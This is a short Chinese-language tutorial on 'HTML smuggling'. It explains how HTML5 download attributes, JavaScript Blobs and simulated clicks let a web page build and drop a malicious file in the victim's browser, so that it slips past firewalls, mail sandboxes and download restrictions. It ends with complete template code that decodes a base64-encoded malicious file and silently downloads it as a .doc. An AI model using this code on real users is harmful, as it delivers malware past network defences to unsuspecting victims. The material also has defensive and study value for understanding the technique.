HTML Smuggling

结合使用 HTML5 和 JavaScript 将恶意文件绕过内容过滤器。

  • 防火墙过滤office宏代码

  • 邮件附件过不了沙箱

  • 公司网络安全策略禁止通过浏览器下载文件

  • ...

1
HTML下载属性

HTML5为a标签引入了“下载”属性。

<a href="/test.doc" download="evil.doc">Download Doc</a>

当用户点击超链接时，下载属性会指示浏览器下载由 href 属性指向的目标，并将其作为“myfile.doc”保存到磁盘。当然，锚点及其下载属性也可以使用 JavaScript 而不是 HTML 创建：

var myAnchor = document.createElement('a');myAnchor.download = 'filename.doc';


2
Blob和URL

我们将它与JavaScript Blob结合起来。Blob 是代表原始数据的不可变对象。Blob 允许您在客户端上构造类似文件的对象，您可以将这些对象传递给需要 URL 的 JavaScript API。可以使用纯 JavaScript 在本地构建 Blob，而不是要求 Web 服务器提供文件。

var myBlob = new Blob([myData], {type: 'octet/stream'});

这一行创建了一个 MIME 类型“octet/stream”的 Blob，并用变量 myData 中包含的数据填充。然后我们可以使用URL.createObjectURL从我们的 Blob 对象创建一个 URL 并有一个指向它的锚点：

var myUrl = window.URL.createObjectURL(blob);myAnchor.href = myUrl;

最后，我们可以使用 JavaScript 的HTMLElement.click()方法模拟对锚点对象的点击 ：

myAnchor.click();

这将导致触发锚点的点击事件，该事件又指向我们的 Blob，并将作为“filename.doc”下载（因为我们指定了下载属性）。

Tips - 对于旧版本的 Internet Explorer（不是 Edge），我们可以恢复到msSaveBlob方法以将 Blob 对象保存到磁盘。

示例代码 & 流程

客户端从 Web 服务器检索网页（仅包含 HTML 和 JavaScript）。因此，任何防御系统只会看到通过网络传递的 HTML 和 JavaScript 的组合。因此，这种技术使基于 MIME 类型的基于边界的恶意内容检测变得毫无用处（没有 .doc 传输！）。当网页在客户端的浏览器中呈现时，恶意文件使用 JavaScript 进行解码，放置在 Blob 中并随后下载。这些最后部分仅发生在受害者的网络浏览器中。

function base64ToArrayBuffer(base64) {  var binary_string = window.atob(base64);  var len = binary_string.length;  var bytes = new Uint8Array( len );  for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }  return bytes.buffer;}
var file ='<< BASE64 ENCODING OF MALICIOUS FILE >>';var data = base64ToArrayBuffer(file);var blob = new Blob([data], {type: 'octet/stream'});var fileName = 'outflank.doc';
if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);else {  var a = document.createElement('a');  document.body.appendChild(a);  a.style = 'display: none';  var url = window.URL.createObjectURL(blob);  a.href = url;  a.download = fileName;  a.click();  window.URL.revokeObjectURL(url);}
